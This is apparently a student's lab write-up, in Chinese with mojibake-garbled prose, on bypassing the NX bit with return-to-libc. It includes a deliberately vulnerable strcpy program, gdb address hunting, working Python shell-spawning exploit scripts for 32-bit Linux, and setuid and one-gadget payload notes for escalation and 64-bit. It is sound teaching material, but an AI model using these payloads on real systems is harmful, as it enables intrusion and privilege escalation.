# æ ˆæº¢å‡ºå­¦ä¹ ï¼ˆäºŒï¼‰Return2Libc

è·Ÿéšæ•™ç¨‹https://sploitfun.wordpress.com/2015/

æ­¤æ¬¡å®éªŒå‚è€ƒhttps://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-return-to-libc/

åˆçœ‹åˆ°ä¸€ä¸ªå¥½çš„åšå®¢ï¼Œä¹Ÿæ˜¯æ ˆæº¢å‡ºç³»åˆ—ï¼šhttps://www.ret2rop.com/2018/08/return-to-libc.html

## NXä¿æŠ¤æœºåˆ¶

â€‹	NXä¿æŠ¤æœºåˆ¶åŸåˆ™ä¸ºå¯å†™ä¸å¯æ‰§è¡Œäº’æ–¥ï¼Œè¿™å°±å¯¼è‡´æˆ‘ä»¬ä¹‹å‰åœ¨æ ˆä¸Šçš„shellcodeä¸å¯ä»¥è¢«æ‰§è¡Œï¼Œå› æ­¤æˆ‘ä»¬é‡‡ç”¨return2libcè¿›è¡Œæ”»å‡»

## å®éªŒç¯å¢ƒ

â€‹	Ubuntu12.04

## æ¼æ´ä»£ç ï¼š

```c
 //vuln.c
#include <stdio.h>
#include <string.h>

int main(int argc, char* argv[]) {
 char buf[256]; /* [1] */ 
 strcpy(buf,argv[1]); /* [2] */
 printf("%s\n",buf); /* [3] */
 fflush(stdout);  /* [4] */
 return 0;
}
```

è¾ƒäºä¹‹å‰çš„æ¼æ´ä»£ç ï¼Œå¢åŠ äº†fflushå‡½æ•°çš„è°ƒç”¨ï¼Œä¸»è¦æ˜¯ä¸ºäº†å‘æˆ‘ä»¬æä¾›shå­—ç¬¦ä¸²ã€‚

## ç¼–è¯‘å‘½ä»¤

```shell
#echo 0 > /proc/sys/kernel/randomize_va_space
$gcc -g -fno-stack-protector -o vuln vuln.c
```

å»é™¤äº†```-z execstack```è¿™ä¸€ç¼–è¯‘å‘½ä»¤ï¼Œè¡¨ç¤ºå¼€å¯NXä¿æŠ¤æœºåˆ¶ã€‚

æˆ‘ä»¬å¯ä»¥ç”¨ä¸€ä¸‹å‘½ä»¤æ¥æŸ¥çœ‹æ ˆä¸Šä»£ç æ˜¯å¦å¯æ‰§è¡Œ

```shell
$ readelf -l vuln
...
Program Headers:
 Type      Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
 PHDR      0x000034 0x08048034 0x08048034 0x00120 0x00120 R E 0x4
 INTERP    0x000154 0x08048154 0x08048154 0x00013 0x00013 R 0x1
 [Requesting program interpreter: /lib/ld-linux.so.2]
 LOAD      0x000000 0x08048000 0x08048000 0x00678 0x00678 R E 0x1000
 LOAD      0x000f14 0x08049f14 0x08049f14 0x00108 0x00118 RW 0x1000
 DYNAMIC   0x000f28 0x08049f28 0x08049f28 0x000c8 0x000c8 RW 0x4
 NOTE      0x000168 0x08048168 0x08048168 0x00044 0x00044 R 0x4
 ...
 GNU_STACK 0x000000 0x00000000 0x00000000 0x00000 0x00000 RW 0x4
 GNU_RELRO 0x000f14 0x08049f14 0x08049f14 0x000ec 0x000ec R 0x1
$
```

å¯ä»¥çœ‹åˆ°GNU_STACKæƒé™å­—æ®µæ²¡æœ‰Xï¼ˆXè¡¨ç¤ºå¯æ‰§è¡Œï¼‰ã€‚å¦‚æœå®‰è£…äº†gdb pedaæ’ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨checksecå‘½ä»¤æŸ¥çœ‹è¯¥ä»£ç çš„ä¿æŠ¤æœºåˆ¶ï¼š

![image-20201022220534961](http://sql.icrystal.top/image-20201022220534961.png)

## Return2Libcæ€æƒ³

â€‹		ä¸ºäº†ç»•è¿‡NXä¿æŠ¤æœºåˆ¶ï¼Œæˆ‘ä»¬æ­¤æ¬¡é‡‡ç”¨Return2LibcæŠ€æœ¯ï¼Œä¸»è¦æ€æƒ³å°±æ˜¯ä¹‹å‰çš„return addressæ”¹æˆæˆ‘ä»¬shellcodeçš„èµ·å§‹åœ°å€ï¼Œä½†é‚£ä¸ªæ˜¯å±äºæ ˆåœ°å€ï¼Œç°åœ¨æˆ‘ä»¬æ‰¾ä¸€ä¸ªå¯æ‰§è¡Œçš„å‡½æ•°ï¼ŒæŠŠä»–çš„åœ°å€æ”¾åœ¨return addressé‚£é‡Œï¼Œå¦‚æœéœ€è¦çš„è¯ï¼Œå†ç»™ä»–ä¼ ä¸ªå‚æ•°ï¼Œé€šå¸¸è¿™ä¸ªå‡½æ•°æˆ‘ä»¬ç”¨libcé‡Œé¢çš„å‡½æ•°ï¼Œå¦‚systemã€execvç­‰ï¼Œæ­¤æ¬¡æˆ‘ä»¬é€šè¿‡è°ƒç”¨system('/bin/sh')å‡½æ•°æ¥è·å–shellæƒé™ã€‚

â€‹		æœ¬æ¬¡æ”»å‡»éœ€è¦ä»¥ä¸‹ä¸‰æ­¥ï¼š

* æ‰¾åˆ°bufèµ·å§‹åœ°å€åˆ°è¿”å›åœ°å€çš„ç©ºé—´å¤§å°

  å‚è§æ ˆæº¢å‡ºå­¦ä¹ (ä¸€)

* æ‰¾åˆ°systemçš„åœ°å€

  * æ‰¾åˆ°libcèµ·å§‹åœ°å€å’Œsystemåç§»åœ°å€

    * libcèµ·å§‹åœ°å€

      * ```ldd vuln```æ‰¾åˆ°libcèµ·å§‹åœ°å€ï¼ˆé”™è¯¯æ–¹æ³•ï¼‰

        ![image-20201022231145154](http://sql.icrystal.top/image-20201022231145154.png)

      * å¦‚æœè£…äº†gdb pedaï¼Œåœ¨gdbä¸­è¿è¡Œvmmapï¼ˆéœ€è¦å…ˆè¿è¡Œèµ·æ¥ç¨‹åºï¼Œå³gdbä¸­è¾“å…¥runè¿è¡Œï¼‰

        ![image-20201022231648629](http://sql.icrystal.top/image-20201022231648629.png)

      * å¦‚æœæ²¡æœ‰è£…gdb pedaï¼Œåœ¨gbdä¸­è¿è¡Œ```info proc map```ï¼Œæˆ–è€…é€šè¿‡```info inferior```ï¼ŒæŸ¥çœ‹å½“å‰è¿è¡Œè¿›ç¨‹çš„pidï¼ˆä¹Ÿæœ‰çš„æ•™ç¨‹è¯´p getpid()æŸ¥çœ‹ï¼Œä½†æ˜¯åœ¨æˆ‘çš„æœºå™¨ä¸­ä¸å¥½ä½¿ï¼‰ï¼Œç„¶å```shell cat /proc/è¿›ç¨‹pid/maps```æŸ¥çœ‹

      å…¶å®å¯ä»¥çœ‹åˆ°lddå¾—åˆ°çš„èµ·å§‹åœ°å€ + åç§»åœ°å€å’Œç¬¬äºŒä¸ªæ–¹æ³•ç›´æ¥å¾—åˆ°çš„systemåœ°å€ä¸ä¸€è‡´ï¼ŒåŸå› lddå¾—åˆ°çš„èµ·å§‹åœ°å€å¾€å¾€æ˜¯é”™è¯¯çš„ã€‚

      é€šå¸¸æˆ‘ä»¬åœ¨gdb-pedaä¸­ä½¿ç”¨```vmmap```ï¼ˆä¹Ÿè¦å…ˆè¿è¡Œç¨‹åºï¼‰æˆ–è€…gdbä¸­å¦‚æœæ²¡æœ‰æ’ä»¶åœ¨gdbä¸­```info proc mapping```æŸ¥çœ‹åŠ¨æ€é“¾æ¥åº“åœ°å€ï¼Œä»–çš„èµ·å§‹åœ°å€ä¸º0xb7e20000ï¼ŒåŠ ä¸Šä¸Šä¸€æ­¥read -så¾—åˆ°çš„åç§»åœ°å€0x0003f460ï¼Œå°±ç­‰äºä¸‹é¢p systemç›´æ¥å¾—åˆ°çš„0xb7e5f460å•¦ã€‚

    * ```readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system```

      ![image-20201022231217676](http://sql.icrystal.top/image-20201022231217676.png)

  * é€šè¿‡gdbç›´æ¥æ‰¾åˆ°systemåœ°å€ï¼ˆæ³¨æ„éœ€è¦å…ˆè¿è¡Œç¨‹åºï¼‰

    ```
    gdb-peda$ p system
    $1 = {<text variable, no debug info>} 0xb7e5f460 <system>
    ```

    ![image-20201022231335364](http://sql.icrystal.top/image-20201022231335364.png)

  

* æ‰¾åˆ°å‚æ•°"/bin/sh"çš„åœ°å€

  * æš´åŠ›æœç´¢

    ```(gdb) x/500s $esp```åœ¨æ ˆä¸­æ‰¾ä¸€ä¸‹"/bin/sh"å­—æ®µï¼Œå¯ä»¥æ‰¾åˆ°å­˜åœ¨"/bin/bash"å­—æ®µã€‚

    ![image-20201022232940087](http://sql.icrystal.top/image-20201022232940087.png)

    SHELL=å äº†6ä¸ªå­—èŠ‚ï¼Œå› æ­¤æˆ‘ä»¬"/bin/bash"èµ·å§‹åœ°å€ä¸º0xbffff581

    ä½†è¿™ä¸ªåœ°å€å¯¹æˆ‘ä¸ç®¡ç”¨ğŸ¤£

  * export ç¯å¢ƒå˜é‡

    ```shell
    $ export pwn_sh="/bin/sh"
    $ echo $pwn_sh
    $ ./gtenv pwn_sh		
    ```

    è¿™ä¸ªæ˜¯åˆ«çš„æ•™ç¨‹ç»™çš„ï¼Œä½†æ˜¯./gtenvæˆ‘æ²¡æœ‰åŠæ³•è¿è¡Œï¼Œåˆåœ¨å…¶ä»–æ•™ç¨‹ä¸­çœ‹åˆ°è‡ªå·±ç¼–å†™Cç¨‹åºï¼Œè·å–ç¯å¢ƒå˜é‡åœ°å€

    ```c
    #!cpp
    #include <stdio.h>
    #include <stdlib.h>
    
    int main(int argc, char *argv[]) {
        char *addr;
        addr = getenv(argv[1]);
        printf("%s is located at %p\n", argv[1], addr);
        return 0;
    }
    ```

    æˆ‘ä»¬å¯ä»¥è¿è¡Œè¯¥ç¨‹åº```./a.out pwn_sh

    ![image-20201022233807357](http://sql.icrystal.top/image-20201022233807357.png)

    ä½†æ˜¯è¿™ä¸ªåœ°å€è¿˜æ˜¯æ²¡æˆåŠŸğŸ˜‚

  * ç›´æ¥åœ¨libcä¸­å¯»æ‰¾"/bin/sh"å­—æ®µ

    * ```find "/bin/sh"```

    ![image-20201022234621904](http://sql.icrystal.top/image-20201022234621904.png)

    â€‹	ç¬¬ä¸€ä¸ªåœ¨libcä¸­çš„å¯ä»¥ä½¿ç”¨ï¼Œä½†æ˜¯ç¬¬äºŒä¸ªåœ¨æ ˆä¸­çš„ä¸å¯ä»¥ä½¿ç”¨ï¼ˆæˆ‘ä¸€ç›´è§‰å¾—æ ˆä¸­çš„ä¸œè¥¿ä¸é è°±ï¼Œå¯èƒ½å’Œè°ƒè¯•çš„æ—¶å€™æ ˆåœ°å€å’Œå®é™…è¿è¡Œæ˜¯æ ˆåœ°å€çš„ä¸åŒå¯¼è‡´çš„å§ï¼‰ã€‚

    * æœ‰çš„æ•™ç¨‹ç”¨è¿™ä¸ªå‘½ä»¤æ‰¾åˆ°```searchmem "/bin/sh" libc```ï¼Œä½†æ˜¯æˆ‘æ²¡æ‰¾åˆ°ğŸ˜‚

    * è¿˜æœ‰çš„æ•™ç¨‹å…ˆç”¨æŒ‡ä»¤``` strings -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"```æ‰¾åˆ°"/bin/sh"çš„åç§»åœ°å€ï¼Œç„¶åå’Œåˆšæ‰vmmapæ‰¾åˆ°çš„èµ·å§‹åœ°å€ç›¸åŠ ï¼Œè·å–libcä¸­"/bin/sh"çš„åœ°å€

      ![image-20201022235550731](http://sql.icrystal.top/image-20201022235550731.png)

      å¯ä»¥é€šè¿‡gdbè°ƒè¯•æŸ¥çœ‹0xb7e20000+0x161ff8åœ°å€å¤„ç¡®å®å­˜æ”¾"/bin/sh"

      ![image-20201022235735164](http://sql.icrystal.top/image-20201022235735164.png)

      0xb7e20000+0x161ff8 = 0xb7f81ff8ï¼ˆå’Œæˆ‘ä»¬```find "/bin/sh"```æ‰¾åˆ°çš„libcä¸­åœ°å€ä¸€æ ·ï¼‰

## å¼€å§‹åˆ©ç”¨æ¼æ´

```python
#exp.py
#!/usr/bin/env python
import struct
from subprocess import call

#Since ALSR is disabled, libc base address would remain constant and hence we can easily find the function address we want by adding the offset to it. 
#For example system address = libc base address + system offset
#where 
       #libc base address = 0xb7e22000 (Constant address, it can also be obtained from vmmap)
       #system offset     = 0x0003f060 (obtained from "readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system")
# libc_base_address = 0xb7e20000 
# system_offset = 0x0003f460
# exit_offset = 0x00032fe0

# system = libc_base_address + system_offset        #0xb7e2000+0x0003f060
system = 0xb7e5f460
# exit = libc_base_address + exit_offset          #0xb7e2000+0x00032be0
exit = 0xb7e52fe0

#system_arg points to 'sh' substring of 'fflush' string. 
#To spawn a shell, system argument should be 'sh' and hence this is the reason for adding line [4] in vuln.c. 
#But incase there is no 'sh' in vulnerable binary, we can take the other approach of pushing 'sh' string at the end of user input!!
system_arg = 0xb7f81ff8     #(obtained from hexdump output of the binary)

#endianess conversion
def conv(num):
 return struct.pack("<I",num)

# Junk + system + exit + system_arg
buf = "A" * 268
buf += conv(system)
buf += conv(exit)
buf += conv(system_arg)

print "Calling vulnerable program"
call(["./vuln", buf])
```

æˆåŠŸæˆªå›¾

![image-20201023000420796](http://sql.icrystal.top/image-20201023000420796.png)

## æ€è€ƒï¼š

* lddæ˜¾ç¤ºçš„åŸºåœ°å€ç„¶ååŠ ä¸Šåç§»å’Œp systemåœ°å€ä¸ä¸€è‡´

  çœ‹äº†ä¸€é€šè§£é‡Šï¼Œç ä½äº†ä¸€ä¸ªçœ‹ä¸å¤ªæ‡‚é“¾æ¥:https://reverseengineering.stackexchange.com/questions/6657/why-does-ldd-and-gdb-info-sharedlibrary-show-a-different-library-base-addr

  åæ­£lddä¸å¯ä¿¡å°±å®Œäº‹äº†ã€‚

  ![image-20201024102240673](http://sql.icrystal.top/image-20201024102240673.png)

* lddçš„åŠ¨æ€é“¾æ¥åº“å’Œvmmapæ˜¾ç¤ºçš„åŠ¨æ€åº“ä¸ä¸€æ ·

  lddé“¾æ¥å‡ºæ¥çš„```/lib/i386-linux-gnu/libc.so.6```åªæ˜¯vmmapä¸­```libc-2.15.so```çš„ç¬¦å·é“¾æ¥ç½¢äº†

  ![image-20201023200316288](http://sql.icrystal.top/image-20201023200316288.png)

  ä»¥ä¸‹å†…å®¹æ‘˜å–:https://stackoverflow.com/questions/13790973/what-is-the-difference-between-lib-i386-linux-gnu-libc-so-6-lib-x86-64-linux

  > This is not a library, but a linker script file, which refers to the above symlinks.
  >
  > Why do we need all these:
  >
  > First, regardless of libc version installed, the linker will always search for `libc.so`, because the compiler driver will always pass to the linker the `-lc` options. The name `libc` stays the same and denotes to most recent version of the library.
  >
  > The symlinks `libc.so.6` are named after the *soname* of the library, which, more or less corresponds to the ABI version of the library. The executables, linked against `libc.so` in fact contain runtime dependencies on `libc.so.6`.
  >
  > If we imagine the someday a grossly ABI incompatible libc is released, it's soname could be named `libc.so.7`, for example and this version coukld coexists with the older `libc.so.6` version, thus executables linked against one or the other can coexist in the same system,
  >
  > And finally, the name `libc-2.15.so` refers to the libc release, when you install a new libc package, the name will change to `libc-2.16.so`. Provided that it is binary compatible with the previous release, the `libc.so.6` link will stay named that way and the existing executables will continue to work.

* /bin/shæ€ä¹ˆæ‰¾

  æœ€å¥½ä¸ç”¨æ ˆä¸Šçš„"/bin/sh"ï¼Œç›´æ¥åœ¨libcé‡Œé¢æ‰¾ï¼Œä¸å¼€ASLRï¼Œå…¶åœ°å€æ˜¯ç¡®å®šçš„ã€‚

* è°ƒè¯•åœ°å€å’ŒçœŸå®è¿è¡Œåœ°å€ä¸ä¸€æ ·ç–‘æƒ‘ç‚¹

  GDBåŠ å…¥äº†ä¸€äº›è°ƒè¯•ä¿¡æ¯æˆ–è€…ç¯å¢ƒå˜é‡çš„ä¸œè¥¿ï¼Œå¯¼è‡´å†…å­˜æ ¼å±€ä¸ä¸€æ ·

  å¦‚æœåœ¨pythonè„šæœ¬ä¸­ä½¿ç”¨```gdb.attach(r)```è¿™ç§è¯­å¥ï¼Œæ˜¾ç¤ºçš„espåœ°å€åº”è¯¥å°±æ˜¯ä¸€è‡´çš„ï¼ˆå°šæœªè¯å®ï¼‰

## Modern 32 bit ELF Binary

å‚è€ƒé“¾æ¥ï¼šhttps://www.ret2rop.com/2018/08/return-to-libc.html

### å®éªŒç¯å¢ƒ

â€‹	Ubuntu18.04

åœ¨64ä½æœºå™¨ä¸Šç¼–è¯‘32ä½äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç”Ÿæˆçš„ä»£ç å’Œæˆ‘ä»¬ç›´æ¥åœ¨32ä½æœºå™¨ä¸Šç¼–è¯‘çš„ä¸ä¸€æ ·ï¼Œè€Œä¸”æˆ‘ä»¬éœ€è¦ä¸‹è½½gcc-multilibåŒ…ï¼ˆapt installå…·ä½“å‘½ä»¤å¿˜è®°äº†:smile:)

ä¸»è¦æ˜¯è§£å†³push cxå’Œpop cxçš„é—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¦†ç›–ecxçš„å€¼ï¼Œä½¿å…¶æŒ‡å‘systemçš„åœ°å€+4ï¼Œç­‰åˆ°lea esp,[ecx - 0x4]æ—¶ä½¿å…¶æŒ‡å‘espæŒ‡å‘systemåœ°å€ï¼Œretæ—¶ï¼Œsystemåœ°å€è£…è½½åˆ°ripä¸­æ‰§è¡Œsystemå‡½æ•°

![image-20201028214834323](C:\Users\JacksonSang\AppData\Roaming\Typora\typora-user-images\image-20201028214834323.png)

å¦‚ä½•çŸ¥é“åœ¨gdbä¸­å’Œgdbå¤–é¢æ ˆæŒ‡é’ˆçš„åç§»é‡

```c
#include<stdio.h> 
int main() 
{ 
  int a; 
  printf("%p\n",&a); 
  return 0; 
}
```

â€‹       åœ¨gdbå†…å’Œå¤–åˆ†åˆ«æ‰§è¡Œè¯¥ç¨‹åºï¼Œç„¶åè®¡ç®—ä¸¤è€…åœ°å€çš„åç§»ï¼Œå°±å¯ä»¥å¤§æ¦‚å¾—åˆ°espåœ¨gdbå¤–å’Œå†…çš„åç§»ï¼Œç„¶ååˆ†åˆ«ä»¥ä¸åŒçš„åç§»é‡æ‰§è¡Œç¨‹åºï¼Œæš´åŠ›ç ´è§£ã€‚

![image-20201028215903952](C:\Users\JacksonSang\AppData\Roaming\Typora\typora-user-images\image-20201028215903952.png)

```python
from struct import pack
from subprocess import call
junk='A'*100
system=pack("I",0xf7e22d60)        #convert address to little endian
exit=pack("I",0xf7e16070)
sh=pack("I",0xf7f5c311)
for i in range(0x3b,0x4a):         #just a rough range
    ecx=pack("I",0xffffd248+i)
    payload = junk + ecx + system + exit + sh
    print hex(i)                   #prints exact offset
	call(['./buf',payload])
```

ä¸ºä»€ä¹ˆgdbè¿è¡Œè·å–shellæƒé™æ‰§è¡Œä¸¤æ¬¡ï¼š

> Great we got shell. If you are wondering why it executed /bin/dash two times, it's because system function actually executes command in format "/bin/sh -c <command>". Here command is /bin/sh. You can read man page of system for more info. Execute it outside gdb.

#### ææƒ

æƒ³è¦ææƒçš„è¯ï¼Œéœ€è¦è°ƒç”¨setuid(0)å‡½æ•°ï¼Œä½†æ˜¯æˆ‘ä»¬å¾—è§£å†³ä¼ å…¥0çš„é—®é¢˜ï¼Œè°ƒç”¨å››æ¬¡getså‡½æ•°ï¼Œåœ¨setuidå‚æ•°ä½ç½®ä¼ 0ï¼Œä½†æ˜¯è¿™å°±æ¶‰åŠåˆ°chain libcï¼Œå°±æ˜¯ä½ è¦ç»™æ¯ä¸ªlibcå‡½æ•°ä¼ é€’å‚æ•°ï¼Œç¬¬äºŒä¸ªlibcçš„åœ°å€è¦æ”¾åœ¨ç¬¬ä¸€ä¸ªlibcçš„è¿”å›åœ°å€å¤„ï¼Œé‚£ä¹ˆç¬¬ä¸‰ä¸ªlibcå°±ä¼šå æ®ç¬¬ä¸€ä¸ªlibcçš„ç¬¬ä¸€ä¸ªå‚æ•°ä½ç½®ï¼Œè€Œä¸”ä»–ä»¬çš„å‚æ•°ä½ç½®ä¹Ÿä¼šäº’ç›¸å†²çªï¼ˆå¦‚æœä¸æ­¢ä¸€ä¸ªçš„è¯ï¼‰ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€äº›gadgetï¼Œç”¨popæ¥ç§»åŠ¨espä½ç½®ï¼Œç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªlibcçš„èµ·å§‹ä½ç½®ï¼Œæ ˆå¸ƒå±€å¦‚ä¸‹ï¼š

![img](https://2.bp.blogspot.com/-UVbv1eXjunw/W3B6Rx7EzPI/AAAAAAAAAe0/1nGa4m7O9SYi2ftPbkOIqoyf3pOvDsSyACLcBGAs/s1600/14rs.png)

å®éªŒæ•ˆæœï¼šåœ¨gdbä¸­æ€»æ˜¯æŠ¥é”™ï¼Œç„¶åæˆ‘åœ¨gdbå¤–è¿è¡Œï¼ŒæˆåŠŸè·å–shellæƒé™ï¼Œä½†æ˜¯è·å–ä¸åˆ°rootæƒé™ï¼Œsetuid(0)å¯èƒ½ä¸èµ·ä½œç”¨ã€‚

## Modern 64 bit linux

> 32 bit return to libc was pretty easy, it got little trickier in getting root where you have to set null bytes as argument for setuid. Somehow we did that too. ROP exploitation on 64 bit can make you go nuts at start with functions like strcpy which don't copy null bytes. Why ? It's because of current 48-bit implementation of ***Canonical form addresses**.* Read more about it [here](https://en.wikipedia.org/wiki/X86-64#Virtual_address_space_details). 64 bits can provide 264 bytes (16 EB) of virtual address space. **However currently only the least significant 48 bits of a virtual address are actually used in address translation**. That means addresses from `'0000 0000 0000 0000'` to `'0000 7fff ffff ffff'`. So in order to chain instructions we need to fill next 8 bytes on stack with return address which has **2 null bytes** at start. 8 bytes because it's 64 bit and it will read next 8 bytes for return address. So chaining isn't possible with functions like strcpy as the chain will break with null bytes in input. It still can be done with bugs like *format string exploit* which we will learn in future posts or having functions like **read**(), **memcpy**(), etc. in code which can copy nullbytes. Okay. So strcpy stops at nullbytes. And we don't have any functions in code which will copy null bytes. That means we can only make it return to just one address. We now need to find one address with such rop-gadget that executes the shell for us. 

<img src="C:\Users\JacksonSang\AppData\Roaming\Typora\typora-user-images\image-20201029002917359.png" alt="image-20201029002917359" style="zoom: 200%;" />

ç”±äºæœ‰null byteçš„å­˜åœ¨ï¼Œæˆ‘ä»¬null byteåé¢çš„å†…å®¹éƒ½ä¼šè¢«æˆªæ–­ï¼ˆå¦‚æœæ˜¯strcpyï¼‰ï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½è¦†ç›–ä¸€æ¬¡è¿”å›åœ°å€ï¼Œå¯ä»¥ä½¿ç”¨ropåœ¨libcä¸­æ‰¾åˆ°ä¸€ä¸ªæ‰§è¡Œexcev("/bin/sh", 0 ,0)çš„gadgetï¼Œæ‰¾åˆ°åï¼Œå°†åœ°å€æ”¾åˆ°è¿”å›åœ°å€å¤„ï¼Œå³å¯ã€‚

å¦‚æœæ˜¯read(), memcpy()å‡½æ•°ï¼Œ

```payload = junk + poprdi + null + setuid + onegadget````

å¯ä»¥ä½¿ç”¨ä¸Šé¢çš„payloadè¿›è¡Œæ”»å‡»ï¼Œç”±äº64ä½æ˜¯å‰å…­ä¸ªå‚æ•°ä½¿ç”¨å¯„å­˜å™¨rdiã€rsiã€rdxã€rcxã€r8ã€r9å¯„å­˜å™¨è¿›è¡Œä¼ é€’ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªgadgetæ¥å°†rdiè®¾ä¸º0ï¼Œç„¶åè°ƒç”¨setuidå‡½æ•°ï¼Œæœ€åå†è°ƒç”¨æˆ‘ä»¬çš„libcå‡½æ•°ã€‚